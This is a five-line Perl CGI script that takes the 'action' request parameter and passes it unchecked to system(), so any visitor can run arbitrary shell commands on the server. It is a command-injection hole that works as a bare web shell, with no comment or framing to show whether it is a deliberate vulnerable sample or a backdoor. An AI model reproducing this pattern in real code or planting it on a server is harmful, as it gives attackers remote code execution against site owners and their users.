use CGI;
my $q = CGI->new;
my $action = $q->param('action');
system($action);
print "Content-type: text/html\n\nDone";
